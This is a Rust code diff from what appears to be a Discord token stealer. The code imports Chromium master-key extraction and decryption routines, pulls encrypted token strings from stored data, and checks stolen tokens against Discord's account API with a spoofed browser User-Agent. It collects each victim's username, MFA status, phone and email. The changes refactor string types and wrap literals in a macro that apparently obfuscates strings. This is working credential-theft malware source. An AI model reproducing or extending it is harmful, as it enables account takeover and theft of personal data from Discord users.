@@ -32,6 +32,7 @@ use alloc::vec::Vec;
 use browsers::chromium::{decrypt_protected_data, extract_master_key};
 use collector::{Collector, Software};
 use core::fmt::{Display, Formatter};
+use derive_new::new;
 use filesystem::path::Path;
 use filesystem::storage::StorageFileSystem;
 use filesystem::{FileSystem, WriteTo};
@@ -40,8 +41,10 @@ use requests::{Request, RequestBuilder, ResponseBodyExt};
 use tasks::{CompositeTask, Task, impl_composite_task_runner, parent_name};
 use utils::base64::base64_decode;
 
+#[derive(new)]
 struct TokenValidationTask {
-    token: String,
+    #[new(into)]
+    token: Arc<str>,
 }
 
 impl<C: Collector, F: FileSystem> Task<C, F> for TokenValidationTask {
@@ -66,7 +69,7 @@ impl<C: Collector, F: FileSystem> TokenWriterTask<C, F> {
     fn new(tokens: Vec<String>) -> Self {
         let tokens: Vec<Arc<dyn Task<C, F>>> = tokens
             .into_iter()
-            .map(|token| TokenValidationTask { token })
+            .map(|token| TokenValidationTask::new(token))
             .map(|task| Arc::new(task) as Arc<dyn Task<C, F>>)
             .collect();
 
@@ -197,11 +200,11 @@ fn extract_encrypted_token_strings(input: &[u8]) -> Vec<&[u8]> {
 }
 
 struct TokenInfo {
-    username: String,
-    token: String,
+    username: Arc<str>,
+    token: Arc<str>,
     mfa: bool,
-    phone: Option<String>,
-    email: Option<String>,
+    phone: Option<Arc<str>>,
+    email: Option<Arc<str>>,
 }
 
 impl Display for TokenInfo {
@@ -215,21 +218,21 @@ impl Display for TokenInfo {
             MFA: {}",
             self.token,
             self.username,
-            self.phone.as_ref().unwrap_or(&"None".to_string()),
-            self.email.as_ref().unwrap_or(&"None".to_string()),
+            self.phone.clone().unwrap_or("None".into()),
+            self.email.clone().unwrap_or("None".into()),
             if self.mfa { "Enabled" } else { "Disabled" },
         )
     }
 }
 
-fn get_token_info(token: String) -> Option<TokenInfo> {
-    let resp = Request::get("https://discord.com/api/v9/users/@me")
-        .header("Authorization", &token)
+fn get_token_info(token: Arc<str>) -> Option<TokenInfo> {
+    let resp = Request::get(s!("https://discord.com/api/v9/users/@me"))
+        .header(s!("Authorization"), &token)
         .header(
-            "User-Agent",
+            s!("User-Agent"),
             s!("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0"),
         )
-        .header("Referer", "https://discord.com/channels/@me")
+        .header(s!("Referer"), s!("https://discord.com/channels/@me"))
         .build()
         .send()
         .ok()?;
@@ -241,10 +244,10 @@ fn get_token_info(token: String) -> Option<TokenInfo> {
     let json = resp.body().as_json().ok()?;
 
     Some(TokenInfo {
-        username: json.get("username")?.as_string()?.to_owned(),
+        username: json.get(s!("username"))?.as_string()?,
         token,
-        mfa: *json.get("mfa_enabled")?.as_bool()?,
-        phone: json.get("phone")?.as_string().map(|s| s.to_owned()),
-        email: json.get("email")?.as_string().map(|s| s.to_owned()),
+        mfa: json.get(s!("mfa_enabled"))?.as_bool()?,
+        phone: json.get(s!("phone"))?.as_string(),
+        email: json.get(s!("email"))?.as_string(),
     })
 }
